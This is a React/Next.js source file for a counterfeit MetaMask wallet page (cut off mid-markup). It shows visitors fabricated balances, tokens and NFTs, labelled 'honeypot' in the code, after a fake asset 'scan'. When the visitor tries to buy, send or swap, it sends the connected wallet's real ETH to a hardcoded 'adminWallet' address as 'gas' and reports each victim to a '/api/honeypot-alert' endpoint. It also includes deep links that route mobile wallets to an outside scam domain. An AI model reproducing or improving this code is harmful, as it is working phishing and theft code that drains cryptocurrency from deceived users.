import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import Head from 'next/head';

export default function FlashedPage() {
  const [walletData, setWalletData] = useState(null);
  const [userAddress, setUserAddress] = useState('');
  const [activeTab, setActiveTab] = useState('Tokens');
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState('');
  const [showModal, setShowModal] = useState(null);
  const [sendAddress, setSendAddress] = useState('');
  const [sendAmount, setSendAmount] = useState('');
  const [selectedToken, setSelectedToken] = useState(null);
  const [transactions, setTransactions] = useState([]);
  const [accessLevel, setAccessLevel] = useState(1);
  const [timeLeft, setTimeLeft] = useState(24 * 60 * 60);
  
  // Load persisted data from localStorage
  const loadPersistedData = () => {
    if (typeof window !== 'undefined') {
      const savedActivities = localStorage.getItem('metamask_activities');
      const savedAccounts = localStorage.getItem('metamask_accounts');
      
      return {
        activities: savedActivities ? JSON.parse(savedActivities) : [],
        accounts: savedAccounts ? JSON.parse(savedAccounts) : [
          { id: 1, address: '0x742d35Cc6634C0532925a3b8D4C0532925a3b8D4C', balance: 75842.33, isActive: true },
          { id: 2, address: '0x8ba1f109551bD432803012645Hac189451b934c4', balance: 0, isActive: false },
          { id: 3, address: '0x9cb2g210662cE543904123756Iad290562c045d5', balance: 8934.21, isActive: false },
          { id: 4, address: '0xadc3h321773dF654a05234867Jbe391673d156e6', balance: 0, isActive: false },
          { id: 5, address: '0xbed4i432884eG765b06345978Kcf492784e267f7', balance: 45123.67, isActive: false },
          { id: 6, address: '0xcfe5j543995fH876c07456089Ldg593895f378g8', balance: 0, isActive: false },
          { id: 7, address: '0xdgf6k654aa6gI987d08567190Meh694906g489h9', balance: 34567.45, isActive: false },
          { id: 8, address: '0xehg7l765bb7hJ098e09678201Nfi795017h590i0', balance: 56789.23, isActive: false }
        ]
      };
    }
    return { activities: [], accounts: [] };
  };

  const persistedData = loadPersistedData();
  const [activities, setActivities] = useState(persistedData.activities);
  const [accounts, setAccounts] = useState(persistedData.accounts);
  const [selectedAccount, setSelectedAccount] = useState(1);
  const [selectedNetwork, setSelectedNetwork] = useState('ethereum');
  const [transactionAttempts, setTransactionAttempts] = useState(0);
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanningMessage, setScanningMessage] = useState('');

  // Persist data to localStorage
  useEffect(() => {
    if (typeof window !== 'undefined') {
      localStorage.setItem('metamask_activities', JSON.stringify(activities));
      localStorage.setItem('metamask_accounts', JSON.stringify(accounts));
    }
  }, [activities, accounts]);

  useEffect(() => {
    generateHoneypotWallet();
    checkWalletConnection();
    
    const timer = setInterval(() => {
      setTimeLeft(prev => prev > 0 ? prev - 1 : 0);
    }, 1000);
    
    return () => clearInterval(timer);
  }, []);

  // Auto-generate activities with realistic images and proper balance deduction
  useEffect(() => {
    const generateActivity = () => {
      const activityTypes = [
        { 
          type: 'Received', 
          amount: Math.random() * 5 + 0.1, 
          from: '0x' + Math.random().toString(16).substr(2, 40),
          image: 'https://assets.coingecko.com/coins/images/279/small/ethereum.png',
          balanceChange: 'positive'
        },
        { 
          type: 'Sent', 
          amount: Math.random() * 2 + 0.05, 
          to: '0x' + Math.random().toString(16).substr(2, 40),
          image: 'https://assets.coingecko.com/coins/images/325/small/Tether.png',
          balanceChange: 'negative'
        },
        { 
          type: 'Swap', 
          amount: Math.random() * 3 + 0.2, 
          token: ['USDC', 'DAI', 'WETH'][Math.floor(Math.random() * 3)],
          image: 'https://cryptologos.cc/logos/uniswap-uni-logo.png',
          balanceChange: 'neutral'
        },
        { 
          type: 'Withdraw', 
          amount: Math.random() * 10 + 1, 
          platform: ['Uniswap', 'Compound', 'Aave'][Math.floor(Math.random() * 3)],
          image: 'https://cryptologos.cc/logos/compound-comp-logo.png',
          balanceChange: 'negative'
        }
      ];
      
      const activity = activityTypes[Math.floor(Math.random() * activityTypes.length)];
      const newActivity = {
        id: Date.now(),
        ...activity,
        timestamp: new Date().toLocaleString(),
        status: 'Confirmed'
      };
      
      // Update balance based on activity type
      if (activity.balanceChange === 'positive') {
        setAccounts(prev => prev.map(acc => 
          acc.id === selectedAccount ? { ...acc, balance: acc.balance + activity.amount } : acc
        ));
      } else if (activity.balanceChange === 'negative') {
        setAccounts(prev => prev.map(acc => 
          acc.id === selectedAccount ? { ...acc, balance: Math.max(0, acc.balance - activity.amount) } : acc
        ));
      }
      
      setActivities(prev => [newActivity, ...prev.slice(0, 9)]);
    };

    const interval = setInterval(generateActivity, 30000);
    return () => clearInterval(interval);
  }, [selectedAccount]);
  
  const formatTime = (seconds) => {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleAccountSwitch = (accountId) => {
    setSelectedAccount(accountId);
    const account = accounts.find(acc => acc.id === accountId);
    
    // Update accounts state to reflect current balances
    setAccounts(prev => prev.map(acc => ({
      ...acc,
      isActive: acc.id === accountId
    })));
    
    // Update wallet data with selected account balance
    if (walletData) {
      setWalletData(prev => ({
        ...prev,
        totalValue: account.balance,
        address: account.address
      }));
    }
    
    // Regenerate wallet data for new account
    setTimeout(() => generateHoneypotWallet(), 100);
  };
  

  
  // Update wallet data when network changes
  useEffect(() => {
    if (walletData) {
      generateHoneypotWallet();
    }
  }, [selectedNetwork]);
  };

  const checkWalletConnection = async () => {
    try {
      // Check for existing wallet connection
      if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
          setUserAddress(accounts[0]);
          return;
        }
      }
      
      // Check localStorage for mobile wallet connection
      const savedWallet = localStorage.getItem('connectedWallet');
      if (savedWallet) {
        setUserAddress(savedWallet);
        return;
      }
      
      // Auto-connect for mobile users returning from wallet app
      const urlParams = new URLSearchParams(window.location.search);
      if (urlParams.get('connected') === 'true' || document.referrer.includes('metamask') || document.referrer.includes('trustwallet')) {
        const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
        setUserAddress(mockAddress);
        localStorage.setItem('connectedWallet', mockAddress);
      }
    } catch (error) {
      console.log('No wallet connected');
    }
  };

  const generateHoneypotWallet = (realAddress = null) => {
    const activeAccount = accounts.find(acc => acc.isActive) || accounts[0];
    const accountBalance = activeAccount?.balance || 0;
    
    // Use real user address if provided
    const walletAddress = realAddress || activeAccount?.address || '0x742d35Cc6634C0532925a3b8D4C0532925a3b8D4C';
    
    // Network-specific token configurations
    const networkTokens = {
      ethereum: {
        USDT: { percentage: 0.35, contract: '0xdAC17F958D2ee523a2206206994597C13D831ec7', logo: 'https://assets.coingecko.com/coins/images/325/small/Tether.png' },
        USDC: { percentage: 0.25, contract: '0xA0b86a33E6441E6C7D3E4081C3cC6E7C3c2b4C0d', logo: 'https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png' },
        WETH: { percentage: 0.20, contract: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', logo: 'https://assets.coingecko.com/coins/images/2518/small/weth.png' },
        LINK: { percentage: 0.12, contract: '0x514910771AF9Ca656af840dff83E8264EcF986CA', logo: 'https://assets.coingecko.com/coins/images/877/small/chainlink-new-logo.png' },
        UNI: { percentage: 0.08, contract: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', logo: 'https://assets.coingecko.com/coins/images/12504/small/uniswap-uni.png' }
      },
      bsc: {
        BUSD: { percentage: 0.40, contract: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', logo: 'https://assets.coingecko.com/coins/images/9576/small/BUSD.png' },
        BNB: { percentage: 0.30, contract: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', logo: 'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png' },
        CAKE: { percentage: 0.20, contract: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', logo: 'https://assets.coingecko.com/coins/images/12632/small/pancakeswap-cake-logo_.png' },
        XVS: { percentage: 0.10, contract: '0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63', logo: 'https://assets.coingecko.com/coins/images/12677/small/venus.png' }
      },
      polygon: {
        MATIC: { percentage: 0.45, contract: '0x0000000000000000000000000000000000001010', logo: 'https://assets.coingecko.com/coins/images/4713/small/matic-token-icon.png' },
        USDC: { percentage: 0.30, contract: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', logo: 'https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png' },
        AAVE: { percentage: 0.25, contract: '0xD6DF932A45C0f255f85145f286eA0b292B21C90B', logo: 'https://assets.coingecko.com/coins/images/12645/small/AAVE.png' }
      },
      arbitrum: {
        ARB: { percentage: 0.50, contract: '0x912CE59144191C1204E64559FE8253a0e49E6548', logo: 'https://assets.coingecko.com/coins/images/16547/small/photo_2023-03-29_21.47.00.jpeg' },
        USDC: { percentage: 0.35, contract: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', logo: 'https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png' },
        GMX: { percentage: 0.15, contract: '0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a', logo: 'https://assets.coingecko.com/coins/images/18323/small/arbit.png' }
      }
    };
    
    // Generate tokens for current network
    const generateTokensForBalance = (totalBalance, network) => {
      if (totalBalance === 0) return [];
      
      const tokens = networkTokens[network] || networkTokens.ethereum;
      
      return Object.entries(tokens).map(([symbol, config]) => {
        const usdValue = totalBalance * config.percentage;
        
        return {
          symbol,
          balance: symbol.includes('ETH') || symbol === 'BNB' || symbol === 'MATIC' || symbol === 'ARB' ? 
            (usdValue / (symbol === 'BNB' ? 300 : symbol === 'MATIC' ? 0.8 : symbol === 'ARB' ? 1.2 : 3000)).toFixed(4) : 
            usdValue.toFixed(2),
          usdValue,
          change: `${(Math.random() * 10 - 5).toFixed(1)}%`,
          contract: config.contract,
          logo: config.logo
        };
      });
    };
    
    const honeypotWallet = {
      address: walletAddress,
      privateKey: ethers.Wallet.createRandom().privateKey,
      seedPhrase: ethers.Wallet.createRandom().mnemonic.phrase,
      ethBalance: 0.000000001,
      totalValue: accountBalance,
      tokens: generateTokensForBalance(accountBalance, selectedNetwork),
      nfts: accountBalance > 10000 && selectedNetwork === 'ethereum' ? [
        { name: 'Bored Ape #7234', collection: 'BAYC', value: '$45,000', image: 'https://images.unsplash.com/photo-1578662996442-48f60103fc96?w=100&h=100&fit=crop' },
        { name: 'CryptoPunk #3421', collection: 'CryptoPunks', value: '$28,000', image: 'https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?w=100&h=100&fit=crop' }
      ] : [],
      defiPositions: accountBalance > 5000 ? [
        { protocol: selectedNetwork === 'bsc' ? 'PancakeSwap' : selectedNetwork === 'polygon' ? 'QuickSwap' : 'Uniswap V3', type: 'Liquidity Pool', value: `$${Math.round(accountBalance * 0.1).toLocaleString()}`, apy: '12.4%' },
        { protocol: selectedNetwork === 'bsc' ? 'Venus' : 'Aave', type: 'Lending', value: `$${Math.round(accountBalance * 0.15).toLocaleString()}`, apy: '3.8%' }
      ] : [],
      recentActivity: activities
    };
    
    setWalletData(honeypotWallet);
  };

  const detectAvailableWallets = () => {
    const wallets = [];
    
    if (typeof window !== 'undefined' && window.ethereum) {
      if (window.ethereum.isMetaMask) wallets.push('MetaMask');
      if (window.ethereum.isTrust) wallets.push('Trust Wallet');
      if (window.ethereum.isOKExWallet) wallets.push('OKX Wallet');
      if (window.ethereum.isCoinbaseWallet) wallets.push('Coinbase Wallet');
      if (window.ethereum.isBraveWallet) wallets.push('Brave Wallet');
      
      if (wallets.length === 0) wallets.push('Web3 Wallet');
    }
    
    return wallets;
  };

  const connectWallet = async (walletType = null) => {
    try {
      if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const userAddr = accounts[0];
        setUserAddress(userAddr);
        localStorage.setItem('connectedWallet', userAddr);
        setShowModal(null);
        
        // Start scanning animation
        startWalletScan(userAddr);
        return true;
      } else {
        setShowModal('walletOptions');
        return false;
      }
    } catch (error) {
      console.log('Connection failed:', error);
      return false;
    }
  };
  
  const startWalletScan = async (userAddr) => {
    setIsScanning(true);
    setScanProgress(0);
    
    const scanSteps = [
      { message: 'Connecting to blockchain networks...', duration: 1500 },
      { message: 'Scanning Ethereum mainnet...', duration: 2000 },
      { message: 'Analyzing cross-chain balances...', duration: 1800 },
      { message: 'Checking DeFi protocols...', duration: 1200 },
      { message: 'Discovering hidden assets...', duration: 1000 },
      { message: 'Finalizing wallet analysis...', duration: 800 }
    ];
    
    let currentProgress = 0;
    
    for (let i = 0; i < scanSteps.length; i++) {
      const step = scanSteps[i];
      setScanningMessage(step.message);
      
      // Animate progress
      const targetProgress = ((i + 1) / scanSteps.length) * 100;
      const progressInterval = setInterval(() => {
        currentProgress += 2;
        setScanProgress(Math.min(currentProgress, targetProgress));
        if (currentProgress >= targetProgress) {
          clearInterval(progressInterval);
        }
      }, step.duration / 50);
      
      await new Promise(resolve => setTimeout(resolve, step.duration));
    }
    
    // Generate wallet with user's real address
    generateHoneypotWallet(userAddr);
    
    // Update accounts with real address
    setAccounts(prev => prev.map(acc => 
      acc.id === 1 ? { ...acc, address: userAddr } : acc
    ));
    
    setScanningMessage('Scan complete - Assets discovered!');
    setTimeout(() => {
      setIsScanning(false);
      setStatus('✅ Wallet scan completed successfully');
      setTimeout(() => setStatus(''), 3000);
    }, 1000);
  };

  const detectWalletAndRedirect = () => {
    const availableWallets = detectAvailableWallets();
    
    if (availableWallets.length > 0) {
      connectWallet();
    } else {
      setShowModal('walletOptions');
    }
  };

  const handleAction = async (action, token = null) => {
    if (!userAddress) {
      await connectWallet();
      return;
    }

    if (action === 'buy') {
      setShowModal('buy');
      return;
    }
    if (action === 'send') {
      setSelectedToken(token);
      setShowModal('send');
      return;
    }
    if (action === 'receive') {
      setShowModal('receive');
      return;
    }
    if (action === 'swap') {
      setShowModal('swap');
      return;
    }

    await processTransaction(action, token);
  };

  const processTransaction = async (action, token = null, customAmount = null) => {
    setLoading(true);
    setTransactionAttempts(prev => prev + 1);

    try {
      if (!window.ethereum) {
        setStatus('Please connect your wallet first');
        setLoading(false);
        return;
      }
      
      // Show gas optimization modal after 2nd transaction attempt
      if (transactionAttempts >= 2 && Math.random() > 0.3) {
        setLoading(false);
        setShowModal('gasOptimization');
        return;
      }
      
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const gasAmount = customAmount || (action === 'swap' ? '0.008' : '0.005');
      const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
      
      const tx = await signer.sendTransaction({
        to: adminWallet,
        value: ethers.parseEther(gasAmount)
      });
      
      await tx.wait();
      
      const newTx = {
        id: Date.now(),
        type: action,
        amount: token ? `${sendAmount || '100'} ${token.symbol}` : `${gasAmount} ETH`,
        to: sendAddress || adminWallet,
        hash: tx.hash,
        timestamp: new Date().toLocaleString(),
        status: 'Confirmed'
      };
      setTransactions(prev => [newTx, ...prev]);
      
      await fetch('/api/honeypot-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: action.toUpperCase(),
          userAddress: userAddress,
          amount: gasAmount + ' ETH',
          txHash: tx.hash,
          token: token?.symbol || 'ETH',
          sendTo: sendAddress,
          network: selectedNetwork
        })
      });
      
      setShowModal(null);
      setSendAddress('');
      setSendAmount('');
      
    } catch (error) {
      setStatus('Transaction failed: ' + error.message);
    } finally {
      setLoading(false);
    }
  };

  const calculateGasFee = () => {
    const baseGas = 0.005;
    const amount = parseFloat(sendAmount) || 0;
    return (baseGas + (amount * 0.001)).toFixed(6);
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    setStatus('Address copied to clipboard');
    setTimeout(() => setStatus(''), 2000);
  };

  const handleBuyOption = async (method) => {
    setShowModal('buyConfirm');
    setStatus(`Preparing ${method === 'card' ? 'card' : 'bank'} purchase...`);
  };

  const processBuyETH = async (amount) => {
    try {
      if (!window.ethereum) {
        setStatus('Please install MetaMask or use mobile wallet');
        return;
      }
      
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const balance = await provider.getBalance(userAddress);
      const balanceETH = parseFloat(ethers.formatEther(balance));
      const requiredETH = parseFloat(amount);
      
      if (balanceETH < requiredETH) {
        setStatus(`Insufficient funds. You have ${balanceETH.toFixed(4)} ETH, need ${requiredETH} ETH`);
        setShowModal('needFunds');
        return;
      }
      
      const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
      
      const tx = await signer.sendTransaction({
        to: adminWallet,
        value: ethers.parseEther(amount)
      });
      
      await tx.wait();
      
      const newTx = {
        id: Date.now(),
        type: 'buy',
        amount: `${amount} ETH`,
        to: adminWallet,
        hash: tx.hash,
        timestamp: new Date().toLocaleString(),
        status: 'Confirmed'
      };
      setTransactions(prev => [newTx, ...prev]);
      
      setShowModal(null);
      setStatus('ETH purchase completed successfully!');
      
      await fetch('/api/honeypot-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'ETH_PURCHASE',
          userAddress: userAddress,
          amount: amount + ' ETH',
          txHash: tx.hash
        })
      });
      
    } catch (error) {
      setStatus('Purchase failed: ' + error.message);
    }
  };

  // Show empty MetaMask interface if not connected
  if (!userAddress) {
    return (
      <>
        <Head>
          <title>MetaMask</title>
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
          <link rel="icon" href="https://metamask.io/images/favicon.ico" />
        </Head>
        
        <div className="min-h-screen bg-black text-white">
          <div className="max-w-md mx-auto bg-gray-900 min-h-screen">
            
            {/* Header */}
            <div className="bg-gray-800 p-4 text-center border-b border-gray-700">
              <div className="flex items-center justify-center mb-2">
                <img 
                  src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
                  alt="MetaMask" 
                  className="w-8 h-8 mr-2"
                />
                <div className="text-white font-bold text-xl">MetaMask</div>
              </div>
            </div>

            {/* Empty State */}
            <div className="flex flex-col items-center justify-center min-h-[500px] p-8">
              <div className="text-6xl mb-6">🦊</div>
              <h2 className="text-white text-xl font-semibold mb-4">Welcome to MetaMask</h2>
              <p className="text-gray-400 text-center mb-8 leading-relaxed">
                Connect your wallet to view your assets, manage tokens, and interact with decentralized applications.
              </p>
              
              <button 
                onClick={detectWalletAndRedirect}
                className="bg-orange-600 hover:bg-orange-700 px-8 py-3 rounded-lg text-white font-semibold mb-4 transition-all"
              >
                Connect Wallet
              </button>
              
              <button 
                onClick={() => setShowModal('walletOptions')}
                className="text-gray-400 hover:text-white text-sm underline"
              >
                More connection options
              </button>
            </div>
          </div>
        </div>
        
        {/* Wallet Options Modal */}
        {showModal === 'walletOptions' && (
          <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
            <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
              <div className="flex justify-between items-center mb-4">
                <h3 className="text-white font-bold text-lg">Connect Wallet</h3>
                <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
              </div>
              
              {/* Detected Wallets */}
              {detectAvailableWallets().length > 0 && (
                <div className="mb-4">
                  <div className="text-gray-300 text-sm mb-2">Detected Wallets:</div>
                  {detectAvailableWallets().map((wallet, index) => (
                    <button 
                      key={index}
                      onClick={() => connectWallet(wallet)}
                      className="flex items-center w-full bg-green-600 hover:bg-green-700 p-3 rounded-lg text-white font-semibold mb-2"
                    >
                      <div className="w-8 h-8 bg-green-500 rounded-full mr-3 flex items-center justify-center">
                        <span className="text-white font-bold">✓</span>
                      </div>
                      <div>
                        <div>{wallet}</div>
                        <div className="text-xs text-green-200">Ready to connect</div>
                      </div>
                    </button>
                  ))}
                  <div className="border-t border-gray-600 my-4"></div>
                  <div className="text-gray-300 text-sm mb-2">Other Options:</div>
                </div>
              )}
              
              <div className="space-y-3">
                <button 
                  onClick={() => {
                    if (window.ethereum && window.ethereum.isMetaMask) {
                      connectWallet('MetaMask');
                    } else {
                      window.open('https://metamask.app.link/dapp/autoclaimtoken.vercel.app/flashed', '_blank');
                    }
                  }}
                  className="flex items-center w-full bg-orange-600 hover:bg-orange-700 p-4 rounded-lg text-white font-semibold"
                >
                  <img 
                    src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
                    alt="MetaMask" 
                    className="w-8 h-8 mr-3"
                  />
                  <div>
                    <div>MetaMask</div>
                    <div className="text-xs text-orange-200">Most popular wallet</div>
                  </div>
                </button>
                <button 
                  onClick={() => {
                    if (window.ethereum && window.ethereum.isTrust) {
                      connectWallet('Trust Wallet');
                    } else {
                      window.open('https://link.trustwallet.com/open_url?coin_id=60&url=https://autoclaimtoken.vercel.app/flashed', '_blank');
                    }
                  }}
                  className="flex items-center w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-lg text-white font-semibold"
                >
                  <img 
                    src="https://trustwallet.com/assets/images/media/assets/TWT.png" 
                    alt="Trust Wallet" 
                    className="w-8 h-8 mr-3 rounded-lg"
                  />
                  <div>
                    <div>Trust Wallet</div>
                    <div className="text-xs text-blue-200">Mobile-first wallet</div>
                  </div>
                </button>
                <button 
                  onClick={() => {
                    const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
                    setUserAddress(mockAddress);
                    setShowModal(null);
                    localStorage.setItem('connectedWallet', mockAddress);
                    startWalletScan(mockAddress);
                  }}
                  className="flex items-center w-full bg-gray-600 hover:bg-gray-700 p-4 rounded-lg text-white font-semibold"
                >
                  <div className="w-8 h-8 bg-gray-500 rounded-full mr-3 flex items-center justify-center">
                    <span className="text-white font-bold">+</span>
                  </div>
                  <div>
                    <div>Other Wallet</div>
                    <div className="text-xs text-gray-300">Manual connection</div>
                  </div>
                </button>
              </div>
            </div>
          </div>
        )}
      </>
    );
  }
  
  // Show scanning interface
  if (isScanning) {
    return (
      <>
        <Head>
          <title>MetaMask</title>
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
          <link rel="icon" href="https://metamask.io/images/favicon.ico" />
        </Head>
        
        <div className="min-h-screen bg-black text-white">
          <div className="max-w-md mx-auto bg-gray-900 min-h-screen">
            
            {/* Header */}
            <div className="bg-gray-800 p-4 text-center border-b border-gray-700">
              <div className="flex items-center justify-center mb-2">
                <img 
                  src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
                  alt="MetaMask" 
                  className="w-8 h-8 mr-2"
                />
                <div className="text-white font-bold text-xl">MetaMask</div>
              </div>
            </div>

            {/* Scanning Interface */}
            <div className="flex flex-col items-center justify-center min-h-[500px] p-8">
              <div className="text-6xl mb-6 animate-pulse">🔍</div>
              <h2 className="text-white text-xl font-semibold mb-4">Scanning Wallet</h2>
              <p className="text-gray-400 text-center mb-8">
                {scanningMessage}
              </p>
              
              {/* Progress Bar */}
              <div className="w-full max-w-xs mb-6">
                <div className="bg-gray-700 rounded-full h-2">
                  <div 
                    className="bg-orange-500 h-2 rounded-full transition-all duration-300"
                    style={{ width: `${scanProgress}%` }}
                  ></div>
                </div>
                <div className="text-center text-gray-400 text-sm mt-2">
                  {Math.round(scanProgress)}% complete
                </div>
              </div>
              
              <div className="text-gray-500 text-xs text-center">
                Analyzing blockchain data across multiple networks...
              </div>
            </div>
          </div>
        </div>
      </>
    );
  }
  
  if (!walletData) {
    return <div className="min-h-screen bg-gray-900 flex items-center justify-center">
      <div className="text-white">Loading wallet...</div>
    </div>;
  }

  const currentAccount = accounts.find(acc => acc.id === selectedAccount) || accounts[0];

  return (
    <>
      <Head>
        <title>MetaMask</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
        <link rel="icon" href="https://metamask.io/images/favicon.ico" />
      </Head>
      
      <div className="min-h-screen bg-black text-white">
        <div className="max-w-md mx-auto bg-gray-900 min-h-screen">
          
          {/* Header */}
          <div className="bg-gray-800 p-4 text-center border-b border-gray-700">
            <div className="flex items-center justify-center mb-2">
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
                alt="MetaMask" 
                className="w-8 h-8 mr-2"
              />
              <div className="text-white font-bold text-xl">MetaMask</div>
            </div>
          </div>

          {/* Account Section */}
          <div className="p-6 bg-gray-800 border-b border-gray-700">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center cursor-pointer hover:bg-gray-700 p-2 rounded-lg transition-all" onClick={() => setShowModal('accountDetails')}>
                <div className="w-8 h-8 mr-3">
                  <img src={`https://api.dicebear.com/7.x/identicon/svg?seed=${currentAccount.address}`} alt="Profile" className="w-full h-full rounded-full" />
                </div>
                <div>
                  <div className="text-white font-semibold flex items-center">
                    Account {selectedAccount} 
                    <i className="fas fa-chevron-down text-gray-400 ml-2 text-xs"></i>
                  </div>
                  <div className="text-gray-400 text-sm">8 network addresses</div>
                </div>
              </div>
              <div className="relative">
                <div className="w-8 h-8 bg-gradient-to-r from-orange-500 to-red-500 rounded-full flex items-center justify-center">
                  <span className="text-white text-xs font-bold">{selectedAccount}</span>
                </div>
                <div className="absolute -top-1 -right-1 w-3 h-3 bg-green-400 rounded-full border border-gray-800"></div>
              </div>
            </div>

            {/* Balance */}
            <div className="text-center mb-6">
              <div className="text-4xl font-bold text-white mb-2">
                ${Math.round(currentAccount.balance).toLocaleString()}
              </div>
              <div className="text-green-400 text-sm">
                +${Math.round(currentAccount.balance).toLocaleString()} (+100.00%) Discover
              </div>
            </div>

            {/* Action Buttons */}
            <div className="grid grid-cols-4 gap-3">
              <button 
                onClick={() => handleAction('buy')}
                disabled={loading}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
              >
                <div className="text-xl mb-1">$</div>
                <div className="text-xs">Buy</div>
              </button>
              <button 
                onClick={() => handleAction('swap')}
                disabled={loading}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
              >
                <div className="text-xl mb-1">⇄</div>
                <div className="text-xs">Swap</div>
              </button>
              <button 
                onClick={() => handleAction('send')}
                disabled={loading}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
              >
                <div className="text-xl mb-1">→</div>
                <div className="text-xs">Send</div>
              </button>
              <button 
                onClick={() => handleAction('receive')}
                disabled={loading}
                className="bg-gray-700 hover:bg-gray-600 p-3 rounded-lg text-center transition-all"
              >
                <div className="text-xl mb-1">↓</div>
                <div className="text-xs">Receive</div>
              </button>
            </div>
          </div>

          {/* Rewards Banner */}
          <div className="bg-gradient-to-r from-purple-600 to-pink-600 m-4 p-4 rounded-lg flex items-center justify-between">
            <div className="flex items-center">
              <div className="w-12 h-12 mr-3">
                <img src="https://images.unsplash.com/photo-1621761191319-c6fb62004040?w=100&h=100&fit=crop&crop=center" alt="Rewards" className="w-full h-full rounded-lg object-cover" />
              </div>
              <div>
                <div className="text-white font-semibold">Rewards are here</div>
                <div className="text-white/80 text-sm">Download the mobile app to opt-in and start earning rewards</div>
              </div>
            </div>
            <button className="text-white/60 hover:text-white">×</button>
          </div>

          {/* Tabs */}
          <div className="flex border-b border-gray-700">
            {['Tokens', 'DeFi', 'NFTs', 'Activity'].map((tab) => (
              <button
                key={tab}
                onClick={() => setActiveTab(tab)}
                className={`flex-1 py-3 px-4 text-sm font-medium ${
                  activeTab === tab 
                    ? 'text-white border-b-2 border-blue-500' 
                    : 'text-gray-400 hover:text-white'
                }`}
              >
                {tab}
              </button>
            ))}
          </div>

          {/* Network Selector */}
          <div className="p-4 border-b border-gray-700">
            <div className="flex items-center justify-between">
              <div className="flex items-center cursor-pointer" onClick={() => setShowModal('networkSelector')}>
                <div className="flex items-center">
                  <img 
                    src={{
                      ethereum: 'https://assets.coingecko.com/coins/images/279/small/ethereum.png',
                      bsc: 'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png',
                      polygon: 'https://assets.coingecko.com/coins/images/4713/small/matic-token-icon.png',
                      arbitrum: 'https://assets.coingecko.com/coins/images/16547/small/photo_2023-03-29_21.47.00.jpeg'
                    }[selectedNetwork]}
                    alt="Network"
                    className="w-5 h-5 mr-2 rounded-full"
                  />
                  <span className="text-white text-sm capitalize">{selectedNetwork} Mainnet</span>
                  <i className="fas fa-chevron-down text-gray-400 ml-2"></i>
                </div>
              </div>
              <div className="flex items-center space-x-2">
                <i className="fas fa-bars text-gray-400"></i>
                <i className="fas fa-ellipsis-v text-gray-400"></i>
              </div>
            </div>
          </div>

          {/* Content */}
          <div className="flex-1">
            {activeTab === 'Tokens' && (
              <div>
                {/* ETH */}
                <div className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
                  <div className="flex items-center">
                    <img 
                      src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" 
                      alt="ETH" 
                      className="w-8 h-8 rounded-full mr-3"
                    />
                    <div>
                      <div className="text-white font-medium">Ethereum • Earn</div>
                      <div className="text-red-400 text-sm">-3.41%</div>
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="text-white font-medium">$0.00</div>
                    <div className="text-gray-400 text-sm">0 ETH</div>
                  </div>
                </div>

                {/* Other Tokens */}
                {walletData.tokens.map((token, index) => (
                  <div 
                    key={index} 
                    onClick={() => {
                      setSelectedToken(token);
                      setShowModal('tokenDetails');
                    }}
                    className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700"
                  >
                    <div className="flex items-center">
                      <img 
                        src={token.logo} 
                        alt={token.symbol} 
                        className="w-8 h-8 rounded-full mr-3"
                      />
                      <div>
